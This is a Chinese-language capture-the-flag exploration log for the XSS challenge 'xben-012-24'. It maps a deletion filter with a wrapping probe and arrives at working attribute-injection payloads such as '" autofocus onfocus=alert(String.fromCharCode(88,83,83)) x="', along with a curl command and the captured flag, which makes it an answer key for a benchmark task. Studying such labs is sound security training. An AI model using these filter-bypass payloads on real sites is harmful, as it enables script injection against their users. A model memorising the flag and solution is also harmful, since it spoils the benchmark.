# xben-012-24 · 探索记录

对应题解：[`xben-012-24.md`](./xben-012-24.md)

## 目标与起点

容器 `10.0.173.136:5000`，`Werkzeug/1.0.1 Python/2.7.18`。

`GET /` → `Dalgona Challenges`，入口 `Page`。
`GET /page` 标题 `Dalgona - Triangle`，样式表 `static/css/xss/xss11.css`
（同族：004=xss25、008=xss21、010=xss32、011=xss24）。

反射位置与前面几关不同 —— 在**属性值**里：

```html
<input type=text name=name placeholder="Enter your name..." value="ZZZ">
```

判定信号仍与同族一致：`Congratulations` = 成功；否则是页面自身的
`Oops! ... TypeError ... instead of "XSS"`（对任何输入都出现的默认文案）。

## 第一阶段：先按同族经验试，全失败

| payload | 结果 |
| --- | --- |
| `<svg/onload=alert("XSS")` | 无任何提示（输入被改写） |
| `<input autofocus onfocus=alert("XSS")>` | 无提示 |
| `<script>alert("XSS")</script>` | 无提示 |

注意：这关连 `Sorry you can't use` 都没有，所以必须靠"看反射结果被改成了什么"来判断。

## 第二阶段：确认引号可闭合

| 输入 | 反射 |
| --- | --- |
| `a"b` | `value="a"b"` |
| `abc"def` | `value="abc"def"` |
| `a>b` | `value="a>b"` |
| `a&b` | `value="a&b"` |
| `a'b` | `value="a'b"` |

**引号和尖括号都没有被转义。** 属性上下文成立，可以闭合。

## 第三阶段：用 `Q…Q` 包裹法还原过滤规则

把待测片段夹在两个 `Q` 之间（`Q<片段>Q`），看反射回来剩什么：

| 片段 | 反射 |
| --- | --- |
| `<a` `<b` `<s` `<i` `<x` `<p` | `QQ`（两个都不剩） |
| `<em` | `QmQ`（删了 `<e`） |
| `<div` | `QivQ`（删了 `<d`） |
| `<script` | `QcriptQ`（删了 `<s`） |
| `<svg` | `QvgQ`（删了 `<s`） |
| `</` | `QQ` |
| `</s` | `QsQ`（删了 `</`） |
| `<1` | `Q<1Q`（保留） |
| `< a` | `Q< aQ`（保留） |
| `<<` | `Q<Q`（第二个 `<` 连同后面的 `Q` 被删） |
| `"XSS"` | `QQ` |
| `'XSS'` | `QQ` |
| `XSS`（裸） | `QXSSQ`（保留） |
| `"xs"` | `Q"xs"Q`（保留，大小写敏感） |
| `alert("XSS")` | `Qalert()Q` |
| `autofocus` / `onfocus` / `alert` | 保留 |
| `a b` | `Qa bQ`（**空白不删**） |

结论两条：

```text
1) re.sub(r'<[A-Za-z/]', '', s)     # < + 字母、或 </  → 删两个字符
2) re.sub(r'"XSS"|\'XSS\'', '', s)  # 带引号的 XSS 整段删除
```

第一条完美解释 `<<Q` → `<`：位置 0 的 `<` 后面是 `<`（不匹配），位置 1 的 `<` 后面是 `Q`（匹配）→ 删掉 `<Q`。

第二条是本题的**关键陷阱**：它专门阻止你把 `"XSS"` 直接写进 `alert()`。

## 第四阶段：属性注入 + 运行时生成 XSS

因为 `<`+字母一律被删，造标签这条路基本死了（`<1` 能留但标签名不能是数字）。
但**输入本来就在 `<input>` 的 `value` 属性里**，所以不需要标签：
闭合引号，往同一个元素上追加 `autofocus` / `onfocus` 即可。

又因为 `"XSS"` 和 `'XSS'` 都被删，参数改用运行时生成：

| payload | 结果 |
| --- | --- |
| `" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="` | **Congratulations** |
| `" autofocus onfocus=alert(unescape('%58%53%53')) x="` | **Congratulations** |
| `"autofocus onfocus=alert(String.fromCharCode(88,83,83))"`（缺空格） | 失败 |

第三条的反射是 `value=""autofocus onfocus=...` —— 闭合引号后没有空白，
`autofocus` 被当成畸形属性名的一部分，事件属性没能挂上。

## 第五阶段：拿 flag

```bash
curl --get --data-urlencode \
  'name=" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' \
  http://$T/page
```

```html
Congratulations!<p> Here is the flag: flag{09ba4b44-5dfd-4787-a32c-cc595e69af8f}
```

提交：`correct: true, awarded: 300`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `<svg/onload=alert("XSS")`（011 的解法） | 输入被改写，无提示 | `<s` 被删，标签根本形不成 |
| `<input autofocus onfocus=...>`（004/008 的解法） | 同上 | `<i` 被删 |
| `<script>…</script>` | 同上 | `<s` 被删 |
| `alert("XSS")` 直接写 | 变成 `alert()` | `"XSS"` 被整段删除 |
| `alert('XSS')` 用单引号 | 同样被删 | 单双引号都在规则里 |
| `"autofocus onfocus=…`（缺空格） | 事件未挂上 | 闭合引号后需要空白分隔属性 |
| 造 `<1...>` 之类数字开头的标签 | 未尝试（HTML 不允许） | 标签名必须以字母开头，而 `<`+字母被删 |

## 这次真正的收获

1. **先定位反射上下文。** 同一个靶场族里，输入可能落在文本节点（004/008/011）、
   JS 字符串（010）或 HTML 属性（012）。上下文决定了可用的原语：
   属性上下文里"闭合引号 + 追加属性"是最短的路径，而且**完全不需要 `<`**，
   正好绕开"`<`+字母被删"。
2. **`Q…Q` 包裹法可以精确还原删除型过滤。** 26 个片段就把规则定死成
   `<[A-Za-z/]` 和"带引号的 XSS"两条，还能发现"空白不删"这种容易误判的细节
   （011 是删空白的，012 不删，不能混）。
3. **"删除带引号的 XSS"是针对评分条件的定向防御。** 它说明出题人知道你要调
   `alert("XSS")`。应对方式不是换引号，而是让字符串在运行时才出现
   （`String.fromCharCode` / `unescape('%58%53%53')`）。
4. **属性注入要吃掉模板的闭合引号。** 末尾加 `x="`，让模板自带的 `"` 收尾一个空属性，
   否则后续 HTML 结构会被破坏。
5. **闭合引号后面必须补空格。** 这是很容易漏的一个字符：`"autofocus` 不行，
   `" autofocus` 才行。判据是看反射里属性是否正确分开。
